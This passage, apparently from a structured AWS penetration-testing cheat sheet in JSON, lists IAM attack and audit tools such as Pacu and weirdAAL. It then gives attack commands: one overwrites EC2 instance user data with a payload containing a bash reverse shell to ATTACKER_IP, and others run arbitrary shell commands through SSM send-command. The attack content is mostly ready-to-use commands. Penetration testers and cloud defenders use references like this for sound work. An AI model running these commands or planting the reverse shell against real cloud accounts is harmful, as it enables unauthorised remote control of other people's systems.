                },
                {
                    "heading": "IAM Auditing Tools",
                    "type": "list",
                    "content": [
                        "[Pacu](https://github.com/RhinoSecurityLabs/pacu) - AWS exploitation framework",
                        "[weirdAAL](https://github.com/carnal0wnage/weirdAAL) - AWS Attack Library",
                        "[PMapper](https://github.com/nccgroup/PMapper) - IAM path analysis",
                        "[Prowler](https://github.com/prowler-cloud/prowler) - AWS security best practices"
                    ]
                }
            ]
        },
        {
            "heading": "Advanced Attack Techniques",
            "subheadings": [
                {
                    "heading": "EC2 Privilege Escalation (User Data)",
                    "type": "code_block",
                    "content": [
                        "aws ec2 modify-instance-attribute --instance-id=xxx --attribute userData --value file://payload.b64",
                        "",
                        "# payload.b64 should contain a cloud-config script with a reverse shell or keys",
                        "#!/bin/bash",
                        "bash -i >& /dev/tcp/ATTACKER_IP/9999 0>&1"
                    ]
                },
                {
                    "heading": "SSM (Systems Manager) Exploitation",
                    "type": "code_block",
                    "content": [
                        "# Execute shell commands via SSM",
                        "aws ssm send-command --instance-ids \"INSTANCE-ID\" --document-name \"AWS-RunShellScript\" --parameters commands=id",
                        "",
                        "# Get command execution output",
                        "aws ssm list-command-invocations --command-id \"COMMAND-ID\" --details"
                    ]
                }
            ]
        },
